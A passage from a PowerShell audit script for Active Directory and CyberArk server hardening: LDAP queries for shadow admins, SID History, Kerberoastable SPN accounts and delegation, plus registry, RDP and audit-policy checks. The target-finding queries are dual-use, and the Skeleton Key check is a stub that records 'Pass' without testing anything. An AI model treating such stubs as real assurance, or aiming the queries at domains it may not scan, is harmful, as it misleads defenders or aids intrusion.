            $isPrivilegedGroup = $false
            foreach ($group in $memberOf) {
                foreach ($privGroup in $privilegedGroups) {
                    if ($group -match "CN=$privGroup,") {
                        $isPrivilegedGroup = $true
                        break
                    }
                }
            }

            # Skip if already in privileged groups (not a shadow admin)
            if (-not $isPrivilegedGroup) {
                # Check if user has dangerous permissions on privileged objects
                # This is a simplified check - full ACLight would enumerate all ACLs
                $dn = $user.Properties["distinguishedname"][0]
                try {
                    $userADSI = [ADSI]"LDAP://$dn"
                    $acl = $userADSI.ObjectSecurity
                    
                    foreach ($ace in $acl.Access) {
                        $rights = $ace.ActiveDirectoryRights.ToString()
                        if ($rights -match "GenericAll|WriteDacl|WriteOwner|WriteProperty") {
                            if ($ace.IdentityReference -notmatch "SYSTEM|Domain Admins|Enterprise Admins") {
                                $shadowAdmins += $samAccount
                                break
                            }
                        }
                    }
                }
                catch { }
            }
        }

        if ($shadowAdmins.Count -gt 0) {
            $percentage = [math]::Round(($shadowAdmins.Count / $users.Count) * 100, 2)
            
            Add-Finding -Category "AD Security" `
                -CISControl "AD1" `
                -Finding "Potential Shadow Admin accounts detected" `
                -Resource "Active Directory" `
                -CurrentValue "$($shadowAdmins.Count) shadow admins ($percentage%): $($shadowAdmins[0..4] -join ', ')$(if($shadowAdmins.Count -gt 5){'...'})" `
                -ExpectedValue "Shadow admins < $($script:Config.MaxShadowAdminPercentage)%" `
                -Recommendation "Review accounts with direct ACL permissions on privileged objects; use groups instead" `
                -Severity $(if ($percentage -gt $script:Config.MaxShadowAdminPercentage) { "Critical" } else { "High" })
        }
        else {
            Add-Finding -Category "AD Security" `
                -CISControl "AD1" `
                -Finding "No obvious Shadow Admin accounts detected" `
                -Resource "Active Directory" `
                -CurrentValue "0 shadow admins found in quick scan" `
                -ExpectedValue "No shadow admins" `
                -Recommendation "Consider running full ACLight scan for comprehensive analysis" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "AD Security" -CISControl "AD1" `
            -CheckName "Shadow Admin Discovery" `
            -Reason "Error scanning for shadow admins: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-SkeletonKeyDetection {
    Write-AuditLog "Checking for Skeleton Key malware indicators (AD2)..." -Level Info

    try {
        # Get all Domain Controllers
        $rootDSE = [ADSI]"LDAP://RootDSE"
        $configDN = $rootDSE.configurationNamingContext
        
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = [ADSI]"LDAP://$configDN"
        $searcher.Filter = "(objectClass=nTDSDSA)"
        $searcher.PropertiesToLoad.Add("distinguishedName")
        
        $dcs = $searcher.FindAll()

        foreach ($dc in $dcs) {
            $dcDN = $dc.Properties["distinguishedname"][0]
            # Extract server name from DN
            $serverDN = $dcDN -replace "CN=NTDS Settings,", ""
            
            try {
                $serverSearcher = New-Object System.DirectoryServices.DirectorySearcher
                $serverSearcher.SearchRoot = [ADSI]"LDAP://$serverDN"
                $serverSearcher.Filter = "(objectClass=computer)"
                $serverSearcher.PropertiesToLoad.Add("dNSHostName")
                $server = $serverSearcher.FindOne()
                
                if ($server) {
                    $dcName = $server.Properties["dnshostname"][0]
                    
                    # Check for Skeleton Key indicators:
                    # 1. Check if DC responds to authentication with any password (would need special test)
                    # 2. Check for suspicious LSASS memory modifications (requires local access)
                    # For now, we check if DC is reachable and document for manual review
                    
                    $reachable = Test-Connection -ComputerName $dcName -Count 1 -Quiet -ErrorAction SilentlyContinue
                    if ($reachable) {
                        # Check ntdsutil for suspicious replication partners
                        # This is informational - full check requires DC access
                    }
                }
            }
            catch { }
        }

        Add-Finding -Category "AD Security" `
            -CISControl "AD2" `
            -Finding "Skeleton Key detection (requires DC access)" `
            -Resource "Domain Controllers" `
            -CurrentValue "$($dcs.Count) DCs found - manual verification recommended" `
            -ExpectedValue "No Skeleton Key malware" `
            -Recommendation "Run memory analysis on DCs; check for mimikatz::skeleton artifacts" `
            -Severity "Info" `
            -Status "Pass"
    }
    catch {
        Add-SkippedCheck -Category "AD Security" -CISControl "AD2" `
            -CheckName "Skeleton Key Detection" `
            -Reason "Error checking for Skeleton Key: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-SIDHistoryAnalysis {
    Write-AuditLog "Checking for suspicious SID History attributes (AD3)..." -Level Info

    try {
        $rootDSE = [ADSI]"LDAP://RootDSE"
        $domainDN = $rootDSE.defaultNamingContext
        
        # Search for accounts with SID History
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = [ADSI]"LDAP://$domainDN"
        $searcher.PageSize = 1000
        $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(sIDHistory=*))"
        $searcher.PropertiesToLoad.AddRange(@("samaccountname", "sidhistory", "memberof"))

        $usersWithSIDHistory = $searcher.FindAll()
        $riskyAccounts = @()

        # Get privileged group SIDs for comparison
        $privilegedSIDs = @()
        $groupSearcher = New-Object System.DirectoryServices.DirectorySearcher
        $groupSearcher.SearchRoot = [ADSI]"LDAP://$domainDN"
        $groupSearcher.Filter = "(|(cn=Domain Admins)(cn=Enterprise Admins)(cn=Schema Admins)(cn=Administrators))"
        $groupSearcher.PropertiesToLoad.Add("objectSid")
        
        $privGroups = $groupSearcher.FindAll()
        foreach ($group in $privGroups) {
            $privilegedSIDs += (New-Object System.Security.Principal.SecurityIdentifier($group.Properties["objectsid"][0], 0)).Value
        }

        foreach ($user in $usersWithSIDHistory) {
            $samAccount = $user.Properties["samaccountname"][0]
            $sidHistory = $user.Properties["sidhistory"]
            
            foreach ($sidBytes in $sidHistory) {
                $sid = (New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)).Value
                
                # Check if SID History contains privileged SIDs
                foreach ($privSID in $privilegedSIDs) {
                    if ($sid -eq $privSID) {
                        $riskyAccounts += "$samAccount (SID: $sid)"
                    }
                }
                
                # Check for SIDs ending in -500 (Administrator) or -512 (Domain Admins)
                if ($sid -match "-500$|-512$|-519$|-518$") {
                    if ($samAccount -notin ($riskyAccounts | ForEach-Object { $_.Split(" ")[0] })) {
                        $riskyAccounts += "$samAccount (Privileged SID: $sid)"
                    }
                }
            }
        }

        if ($usersWithSIDHistory.Count -gt 0) {
            if ($riskyAccounts.Count -gt 0) {
                Add-Finding -Category "AD Security" `
                    -CISControl "AD3" `
                    -Finding "Accounts with privileged SID History detected" `
                    -Resource "Active Directory" `
                    -CurrentValue "$($riskyAccounts.Count) risky: $($riskyAccounts[0..2] -join '; ')$(if($riskyAccounts.Count -gt 3){'...'})" `
                    -ExpectedValue "No privileged SID History on non-admin accounts" `
                    -Recommendation "Review and remove unnecessary SID History; investigate potential privilege escalation" `
                    -Severity "Critical"
            }
            else {
                Add-Finding -Category "AD Security" `
                    -CISControl "AD3" `
                    -Finding "SID History present but no privileged SIDs found" `
                    -Resource "Active Directory" `
                    -CurrentValue "$($usersWithSIDHistory.Count) accounts with SID History" `
                    -ExpectedValue "SID History only for legitimate migrations" `
                    -Recommendation "Review SID History for migration remnants; clean up old entries" `
                    -Severity "Low"
            }
        }
        else {
            Add-Finding -Category "AD Security" `
                -CISControl "AD3" `
                -Finding "No accounts with SID History found" `
                -Resource "Active Directory" `
                -CurrentValue "0 accounts with SID History" `
                -ExpectedValue "No unnecessary SID History" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "AD Security" -CISControl "AD3" `
            -CheckName "SID History Analysis" `
            -Reason "Error analyzing SID History: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-RiskySPNConfiguration {
    Write-AuditLog "Checking for risky SPN configurations (AD4)..." -Level Info

    try {
        $rootDSE = [ADSI]"LDAP://RootDSE"
        $domainDN = $rootDSE.defaultNamingContext
        
        # Search for user accounts with SPNs (Kerberoasting targets)
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = [ADSI]"LDAP://$domainDN"
        $searcher.PageSize = 1000
        $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
        $searcher.PropertiesToLoad.AddRange(@("samaccountname", "serviceprincipalname", "memberof", "admincount"))

        $usersWithSPN = $searcher.FindAll()
        $privilegedWithSPN = @()
        $allSPNUsers = @()

        $privilegedGroups = @("Domain Admins", "Enterprise Admins", "Schema Admins", "Administrators")

        foreach ($user in $usersWithSPN) {
            $samAccount = $user.Properties["samaccountname"][0]
            $spns = $user.Properties["serviceprincipalname"]
            $memberOf = $user.Properties["memberof"]
            $adminCount = $user.Properties["admincount"]
            
            $allSPNUsers += $samAccount
            
            # Check if user is privileged
            $isPrivileged = ($adminCount -and $adminCount[0] -eq 1)
            
            if (-not $isPrivileged) {
                foreach ($group in $memberOf) {
                    foreach ($privGroup in $privilegedGroups) {
                        if ($group -match "CN=$privGroup,") {
                            $isPrivileged = $true
                            break
                        }
                    }
                }
            }

            if ($isPrivileged) {
                $privilegedWithSPN += "$samAccount (SPNs: $($spns.Count))"
            }
        }

        if ($privilegedWithSPN.Count -gt 0) {
            Add-Finding -Category "AD Security" `
                -CISControl "AD4" `
                -Finding "Privileged accounts with SPNs (Kerberoasting risk)" `
                -Resource "Active Directory" `
                -CurrentValue "$($privilegedWithSPN.Count) privileged: $($privilegedWithSPN[0..2] -join '; ')$(if($privilegedWithSPN.Count -gt 3){'...'})" `
                -ExpectedValue "$($script:Config.SPNPrivilegedAccountLimit) privileged accounts with SPNs" `
                -Recommendation "Remove SPNs from privileged user accounts; use machine accounts or gMSAs for services" `
                -Severity "Critical"
        }
        elseif ($allSPNUsers.Count -gt 0) {
            Add-Finding -Category "AD Security" `
                -CISControl "AD4" `
                -Finding "User accounts with SPNs detected" `
                -Resource "Active Directory" `
                -CurrentValue "$($allSPNUsers.Count) user accounts with SPNs" `
                -ExpectedValue "SPNs on machine accounts or gMSAs only" `
                -Recommendation "Review SPN assignments; ensure strong passwords on SPN accounts" `
                -Severity "Medium"
        }
        else {
            Add-Finding -Category "AD Security" `
                -CISControl "AD4" `
                -Finding "No user accounts with SPNs found" `
                -Resource "Active Directory" `
                -CurrentValue "No Kerberoasting targets" `
                -ExpectedValue "No user SPNs" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "AD Security" -CISControl "AD4" `
            -CheckName "Risky SPN Configuration" `
            -Reason "Error checking SPNs: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-UnconstrainedDelegation {
    Write-AuditLog "Checking for unconstrained delegation (AD5)..." -Level Info

    try {
        $rootDSE = [ADSI]"LDAP://RootDSE"
        $domainDN = $rootDSE.defaultNamingContext
        
        # Search for accounts with unconstrained delegation (TRUSTED_FOR_DELEGATION flag)
        # UserAccountControl flag 524288 = TRUSTED_FOR_DELEGATION
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = [ADSI]"LDAP://$domainDN"
        $searcher.PageSize = 1000
        $searcher.Filter = "(&(|(objectCategory=computer)(objectCategory=person))(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))"
        $searcher.PropertiesToLoad.AddRange(@("samaccountname", "objectcategory", "distinguishedname"))

        $unconstrainedAccounts = $searcher.FindAll()
        $nonDCUnconstrained = @()

        foreach ($account in $unconstrainedAccounts) {
            $samAccount = $account.Properties["samaccountname"][0]
            $dn = $account.Properties["distinguishedname"][0]
            
            # Exclude Domain Controllers (they have unconstrained delegation by design)
            if ($dn -notmatch "OU=Domain Controllers") {
                $nonDCUnconstrained += $samAccount
            }
        }

        if ($nonDCUnconstrained.Count -gt 0) {
            Add-Finding -Category "AD Security" `
                -CISControl "AD5" `
                -Finding "Non-DC accounts with unconstrained delegation" `
                -Resource "Active Directory" `
                -CurrentValue "$($nonDCUnconstrained.Count) accounts: $($nonDCUnconstrained[0..4] -join ', ')$(if($nonDCUnconstrained.Count -gt 5){'...'})" `
                -ExpectedValue "$($script:Config.MaxUnconstrainedDelegation) non-DC unconstrained delegation" `
                -Recommendation "Convert to constrained delegation or remove delegation; unconstrained allows credential theft" `
                -Severity "Critical"
        }
        else {
            Add-Finding -Category "AD Security" `
                -CISControl "AD5" `
                -Finding "No non-DC unconstrained delegation found" `
                -Resource "Active Directory" `
                -CurrentValue "Only DCs have unconstrained delegation" `
                -ExpectedValue "No unnecessary unconstrained delegation" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "AD Security" -CISControl "AD5" `
            -CheckName "Unconstrained Delegation" `
            -Reason "Error checking unconstrained delegation: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-ConstrainedDelegationPT {
    Write-AuditLog "Checking for constrained delegation with protocol transition (AD6)..." -Level Info

    try {
        $rootDSE = [ADSI]"LDAP://RootDSE"
        $domainDN = $rootDSE.defaultNamingContext
        
        # Search for accounts with constrained delegation with protocol transition
        # UserAccountControl flag 16777216 = TRUSTED_TO_AUTH_FOR_DELEGATION
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = [ADSI]"LDAP://$domainDN"
        $searcher.PageSize = 1000
        $searcher.Filter = "(&(|(objectCategory=computer)(objectCategory=person))(userAccountControl:1.2.840.113556.1.4.803:=16777216))"
        $searcher.PropertiesToLoad.AddRange(@("samaccountname", "msds-allowedtodelegateto", "objectcategory"))

        $protocolTransitionAccounts = $searcher.FindAll()

        if ($protocolTransitionAccounts.Count -gt 0) {
            $accountList = @()
            foreach ($account in $protocolTransitionAccounts) {
                $samAccount = $account.Properties["samaccountname"][0]
                $delegateTo = $account.Properties["msds-allowedtodelegateto"]
                $accountList += "$samAccount (delegates to $($delegateTo.Count) SPNs)"
            }

            Add-Finding -Category "AD Security" `
                -CISControl "AD6" `
                -Finding "Constrained delegation with protocol transition detected" `
                -Resource "Active Directory" `
                -CurrentValue "$($protocolTransitionAccounts.Count) accounts: $($accountList[0..2] -join '; ')$(if($accountList.Count -gt 3){'...'})" `
                -ExpectedValue "Protocol transition only when required" `
                -Recommendation "Review need for protocol transition; disable if not required (allows S4U2Self abuse)" `
                -Severity "High"
        }
        else {
            Add-Finding -Category "AD Security" `
                -CISControl "AD6" `
                -Finding "No constrained delegation with protocol transition" `
                -Resource "Active Directory" `
                -CurrentValue "No protocol transition delegation found" `
                -ExpectedValue "Minimal or no protocol transition" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "AD Security" -CISControl "AD6" `
            -CheckName "Constrained Delegation with Protocol Transition" `
            -Reason "Error checking protocol transition: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-DelegationPrivilegeAudit {
    Write-AuditLog "Auditing all delegation configurations (AD7)..." -Level Info

    try {
        $rootDSE = [ADSI]"LDAP://RootDSE"
        $domainDN = $rootDSE.defaultNamingContext
        
        # Count all accounts with any form of delegation
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = [ADSI]"LDAP://$domainDN"
        $searcher.PageSize = 1000
        $searcher.Filter = "(&(|(objectCategory=computer)(objectCategory=person))(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(userAccountControl:1.2.840.113556.1.4.803:=16777216)(msds-allowedtodelegateto=*)))"
        $searcher.PropertiesToLoad.AddRange(@("samaccountname", "useraccountcontrol", "msds-allowedtodelegateto"))

        $delegatedAccounts = $searcher.FindAll()

        $summary = @{
            Unconstrained = 0
            ConstrainedWithPT = 0
            ConstrainedNoPT = 0
        }

        foreach ($account in $delegatedAccounts) {
            $uac = 0
            if ($account.Properties["useraccountcontrol"]) {
                $uac = $account.Properties["useraccountcontrol"][0]
            }
            $allowedTo = $account.Properties["msds-allowedtodelegateto"]

            if ($uac -band 524288) {
                $summary.Unconstrained++
            }
            elseif ($uac -band 16777216) {
                $summary.ConstrainedWithPT++
            }
            elseif ($allowedTo.Count -gt 0) {
                $summary.ConstrainedNoPT++
            }
        }

        $totalDelegated = $delegatedAccounts.Count
        $severity = "Info"
        $status = "Pass"

        if ($summary.Unconstrained -gt 5 -or $totalDelegated -gt $script:Config.MaxDelegatedAccounts) {
            $severity = "High"
            $status = "Fail"
        }
        elseif ($totalDelegated -gt 0) {
            $severity = "Low"
        }

        Add-Finding -Category "AD Security" `
            -CISControl "AD7" `
            -Finding "Delegation Configuration Summary" `
            -Resource "Active Directory" `
            -CurrentValue "Total: $totalDelegated (Unconstrained: $($summary.Unconstrained), Constrained+PT: $($summary.ConstrainedWithPT), Constrained: $($summary.ConstrainedNoPT))" `
            -ExpectedValue "Delegated accounts <= $($script:Config.MaxDelegatedAccounts)" `
            -Recommendation "Review all delegation configurations; prefer constrained without protocol transition" `
            -Severity $severity `
            -Status $status
    }
    catch {
        Add-SkippedCheck -Category "AD Security" -CISControl "AD7" `
            -CheckName "Delegation Privilege Audit" `
            -Reason "Error auditing delegation: $($_.Exception.Message)" `
            -Type "Error"
    }
}

#======================================================================
# SERVER HARDENING CHECKS (HARD1-HARD8) - CYBRHardeningCheck-inspired
#======================================================================

function Test-ServerHardening {
    Write-AuditLog "Running Server Hardening Checks (CYBRHardeningCheck-inspired)..." -Level Info

    Test-UnnecessaryServerRoles
    Test-ScreenSaverConfiguration
    Test-AdvancedAuditPolicyConfig
    Test-RemoteDesktopHardening
    Test-RegistryPermissions
    Test-RegistryAuditing
    Test-FileSystemPermissions
    Test-FileSystemAuditing
}

function Test-UnnecessaryServerRoles {
    Write-AuditLog "Checking for unnecessary server roles (HARD1)..." -Level Info

    try {
        # Roles that should NOT be installed on CyberArk servers
        $unnecessaryRoles = @(
            "Web-Server",           # IIS (unless PVWA)
            "DNS",                  # DNS Server
            "DHCP",                 # DHCP Server
            "Fax",                  # Fax Server
            "Print-Services",       # Print Server
            "NPAS",                 # Network Policy Server
            "Remote-Desktop-Services", # RDS (unless PSM)
            "Hyper-V"               # Hypervisor
        )

        $installedRoles = Get-WindowsFeature | Where-Object { $_.Installed -eq $true }
        $foundUnnecessary = @()

        foreach ($role in $unnecessaryRoles) {
            $installed = $installedRoles | Where-Object { $_.Name -eq $role }
            if ($installed) {
                # Allow Web-Server on PVWA, RDS on PSM
                $isVault = Test-Path "C:\Program Files (x86)\CyberArk\Vault" -ErrorAction SilentlyContinue
                $isPVWA = Test-Path "C:\inetpub\wwwroot\PasswordVault" -ErrorAction SilentlyContinue
                $isPSM = Test-Path "C:\Program Files (x86)\CyberArk\PSM" -ErrorAction SilentlyContinue

                if ($role -eq "Web-Server" -and $isPVWA) { continue }
                if ($role -eq "Remote-Desktop-Services" -and $isPSM) { continue }
                if ($isVault) {
                    $foundUnnecessary += $role
                }
            }
        }

        if ($foundUnnecessary.Count -gt 0) {
            Add-Finding -Category "Server Hardening" `
                -CISControl "HARD1" `
                -Finding "Unnecessary server roles installed" `
                -Resource "Windows Server Roles" `
                -CurrentValue "$($foundUnnecessary.Count) roles: $($foundUnnecessary -join ', ')" `
                -ExpectedValue "Minimal roles for CyberArk function" `
                -Recommendation "Remove unnecessary roles to reduce attack surface" `
                -Severity "High"
        }
        else {
            Add-Finding -Category "Server Hardening" `
                -CISControl "HARD1" `
                -Finding "Server roles appropriately configured" `
                -Resource "Windows Server Roles" `
                -CurrentValue "No unnecessary roles detected" `
                -ExpectedValue "Minimal roles" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Server Hardening" -CISControl "HARD1" `
            -CheckName "Unnecessary Server Roles" `
            -Reason "Error checking server roles: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-ScreenSaverConfiguration {
    Write-AuditLog "Checking screen saver configuration (HARD2)..." -Level Info

    try {
        # Check screen saver settings from registry
        $ssActive = (Get-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "ScreenSaveActive" -ErrorAction SilentlyContinue).ScreenSaveActive
        $ssSecure = (Get-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "ScreenSaverIsSecure" -ErrorAction SilentlyContinue).ScreenSaverIsSecure
        $ssTimeout = (Get-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "ScreenSaveTimeOut" -ErrorAction SilentlyContinue).ScreenSaveTimeOut

        $issues = @()

        if ($ssActive -ne "1") {
            $issues += "Screen saver not active"
        }
        if ($ssSecure -ne "1") {
            $issues += "Screen saver not password protected"
        }
        if ($ssTimeout -and [int]$ssTimeout -gt 900) {
            $issues += "Timeout too long ($ssTimeout seconds)"
        }

        if ($issues.Count -gt 0) {
            Add-Finding -Category "Server Hardening" `
                -CISControl "HARD2" `
                -Finding "Screen saver not properly configured" `
                -Resource "Screen Saver Settings" `
                -CurrentValue $($issues -join "; ") `
                -ExpectedValue "Active, password protected, <= 15 min timeout" `
                -Recommendation "Enable password-protected screen saver with 15-minute or less timeout" `
                -Severity "Medium"
        }
        else {
            Add-Finding -Category "Server Hardening" `
                -CISControl "HARD2" `
                -Finding "Screen saver properly configured" `
                -Resource "Screen Saver Settings" `
                -CurrentValue "Active with password protection" `
                -ExpectedValue "Secure screen saver" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Server Hardening" -CISControl "HARD2" `
            -CheckName "Screen Saver Configuration" `
            -Reason "Error checking screen saver: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-AdvancedAuditPolicyConfig {
    Write-AuditLog "Checking advanced audit policy configuration (HARD3)..." -Level Info

    try {
        # Required audit subcategories for CyberArk servers
        $requiredAudits = @(
            "Credential Validation",
            "Kerberos Authentication Service",
            "Kerberos Service Ticket Operations",
            "Computer Account Management",
            "Security Group Management",
            "User Account Management",
            "Process Creation",
            "Logon",
            "Logoff",
            "Account Lockout",
            "Special Logon",
            "Audit Policy Change",
            "Sensitive Privilege Use",
            "File System",
            "Registry",
            "Kernel Object"
        )

        $auditOutput = auditpol /get /category:* 2>$null
        $missingAudits = @()

        foreach ($audit in $requiredAudits) {
            $found = $auditOutput | Where-Object { $_ -match $audit -and $_ -notmatch "No Auditing" }
            if (-not $found) {
                $missingAudits += $audit
            }
        }

        if ($missingAudits.Count -gt 0) {
            Add-Finding -Category "Server Hardening" `
                -CISControl "HARD3" `
                -Finding "Advanced audit policy incomplete" `
                -Resource "Audit Policy" `
                -CurrentValue "$($missingAudits.Count) missing: $($missingAudits[0..4] -join ', ')$(if($missingAudits.Count -gt 5){'...'})" `
                -ExpectedValue "All required audit subcategories enabled" `
                -Recommendation "Enable auditing for all required subcategories per CyberArk hardening guide" `
                -Severity "High"
        }
        else {
            Add-Finding -Category "Server Hardening" `
                -CISControl "HARD3" `
                -Finding "Advanced audit policy properly configured" `
                -Resource "Audit Policy" `
                -CurrentValue "All required subcategories audited" `
                -ExpectedValue "Comprehensive auditing" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Server Hardening" -CISControl "HARD3" `
            -CheckName "Advanced Audit Policy" `
            -Reason "Error checking audit policy: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-RemoteDesktopHardening {
    Write-AuditLog "Checking Remote Desktop hardening (HARD4)..." -Level Info

    try {
        $issues = @()

        # Check NLA requirement
        $nla = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -ErrorAction SilentlyContinue).UserAuthentication
        if ($nla -ne 1) {
            $issues += "NLA not required"
        }

        # Check encryption level
        $encLevel = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MinEncryptionLevel" -ErrorAction SilentlyContinue).MinEncryptionLevel
        if ($encLevel -lt $script:Config.MinRDPEncryptionLevel) {
            $issues += "Encryption level too low ($encLevel)"
        }

        # Check security layer (2 = TLS)
        $secLayer = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "SecurityLayer" -ErrorAction SilentlyContinue).SecurityLayer
        if ($secLayer -lt 2) {
            $issues += "Not using TLS security layer"
        }

        # Check idle timeout
        $idleTimeout = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" -Name "MaxIdleTime" -ErrorAction SilentlyContinue).MaxIdleTime
        if (-not $idleTimeout -or $idleTimeout -eq 0) {
            $issues += "No idle timeout configured"
        }

        if ($issues.Count -gt 0) {
            Add-Finding -Category "Server Hardening" `
                -CISControl "HARD4" `
                -Finding "Remote Desktop not properly hardened" `
                -Resource "RDP Configuration" `
                -CurrentValue $($issues -join "; ") `
                -ExpectedValue "NLA, TLS, high encryption, idle timeout" `
                -Recommendation "Configure NLA, TLS 1.2+, high encryption, and idle timeout for RDP" `
                -Severity "High"
        }
        else {
            Add-Finding -Category "Server Hardening" `
                -CISControl "HARD4" `
                -Finding "Remote Desktop properly hardened" `
                -Resource "RDP Configuration" `
                -CurrentValue "NLA, TLS, encryption configured" `
                -ExpectedValue "Secure RDP" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Server Hardening" -CISControl "HARD4" `
            -CheckName "Remote Desktop Hardening" `
            -Reason "Error checking RDP settings: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-RegistryPermissions {
    Write-AuditLog "Checking registry permissions (HARD5)..." -Level Info

    try {
        # Critical registry paths to check
        $criticalPaths = @(
            "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa",
            "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders",
            "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        )

        $issues = @()

        foreach ($path in $criticalPaths) {
            if (Test-Path $path) {
                $acl = Get-Acl $path -ErrorAction SilentlyContinue
                foreach ($ace in $acl.Access) {
                    # Check for overly permissive access
                    if ($ace.IdentityReference -match "Everyone|Users|Authenticated Users") {
                        if ($ace.RegistryRights -match "FullControl|WriteKey|SetValue") {
                            $issues += "$path allows write by $($ace.IdentityReference)"
                        }
                    }
                }
            }
        }

        if ($issues.Count -gt 0) {
            Add-Finding -Category "Server Hardening" `
                -CISControl "HARD5" `
                -Finding "Overly permissive registry permissions" `
                -Resource "Registry ACLs" `
                -CurrentValue "$($issues.Count) issues: $($issues[0..1] -join '; ')$(if($issues.Count -gt 2){'...'})" `
                -ExpectedValue "Restrictive permissions on security registry keys" `
                -Recommendation "Remove write permissions for non-admin users on security registry keys" `
                -Severity "High"
        }
        else {
            Add-Finding -Category "Server Hardening" `
                -CISControl "HARD5" `
                -Finding "Registry permissions appropriately configured" `
                -Resource "Registry ACLs" `
                -CurrentValue "No overly permissive ACLs found" `
                -ExpectedValue "Restrictive permissions" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Server Hardening" -CISControl "HARD5" `
            -CheckName "Registry Permissions" `
            -Reason "Error checking registry permissions: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-RegistryAuditing {
    Write-AuditLog "Checking registry auditing (HARD6)..." -Level Info

    try {
        # Check if auditing is enabled on critical registry keys
        $criticalPaths = @(
            "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa",
            "HKLM:\SECURITY"
        )

        $auditConfigured = $false

        foreach ($path in $criticalPaths) {
            if (Test-Path $path) {
                try {
                    $acl = Get-Acl $path -Audit -ErrorAction SilentlyContinue
                    if ($acl.Audit.Count -gt 0) {
                        $auditConfigured = $true
                        break
                    }
                }
                catch { }
            }
        }

        if (-not $auditConfigured) {
            Add-Finding -Category "Server Hardening" `
                -CISControl "HARD6" `
                -Finding "Registry auditing not configured" `
                -Resource "Registry Audit ACLs" `
                -CurrentValue "No audit rules on critical registry keys" `
                -ExpectedValue "Audit rules on LSA and security keys" `
                -Recommendation "Configure auditing on critical registry paths for security monitoring" `
                -Severity "Medium"
        }
        else {
            Add-Finding -Category "Server Hardening" `
                -CISControl "HARD6" `
                -Finding "Registry auditing configured" `
                -Resource "Registry Audit ACLs" `
                -CurrentValue "Audit rules present" `
                -ExpectedValue "Audit on critical keys" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Server Hardening" -CISControl "HARD6" `
            -CheckName "Registry Auditing" `
            -Reason "Error checking registry auditing: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-FileSystemPermissions {
    Write-AuditLog "Checking file system permissions (HARD7)..." -Level Info

    try {
        # Critical paths per CYBRHardeningCheck
        $criticalPaths = @(
            "$env:SystemRoot\System32\Config",
            "$env:SystemRoot\System32\Config\RegBack"
        )

        $issues = @()

        foreach ($path in $criticalPaths) {
            if (Test-Path $path) {
                $acl = Get-Acl $path -ErrorAction SilentlyContinue
                foreach ($ace in $acl.Access) {
                    if ($ace.IdentityReference -match "Everyone|Users") {
                        if ($ace.FileSystemRights -match "FullControl|Modify|Write") {
                            $issues += "$path writable by $($ace.IdentityReference)"
                        }
                    }
                }
            }
        }

        if ($issues.Count -gt 0) {
            Add-Finding -Category "Server Hardening" `
                -CISControl "HARD7" `
                -Finding "Overly permissive file system permissions" `
                -Resource "Critical File Paths" `
                -CurrentValue "$($issues.Count) issues found" `
                -ExpectedValue "Restrictive permissions on system config" `
                -Recommendation "Remove write permissions for non-admin users on system config directories" `
                -Severity "Critical"
        }
        else {
            Add-Finding -Category "Server Hardening" `
                -CISControl "HARD7" `
                -Finding "File system permissions appropriately configured" `
                -Resource "Critical File Paths" `
                -CurrentValue "No overly permissive ACLs" `
                -ExpectedValue "Restrictive permissions" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Server Hardening" -CISControl "HARD7" `
